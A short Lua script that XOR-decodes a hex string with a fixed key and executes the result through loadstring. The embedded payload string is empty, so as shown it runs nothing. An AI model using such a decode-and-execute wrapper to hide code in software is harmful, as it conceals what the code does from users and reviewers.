local k={112,180,120,90,19,27,133,234,201,97,155,41,197,22,67,67,57,214,173,121,131,234,203,201,204,163,255,143,77,125,250,88}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
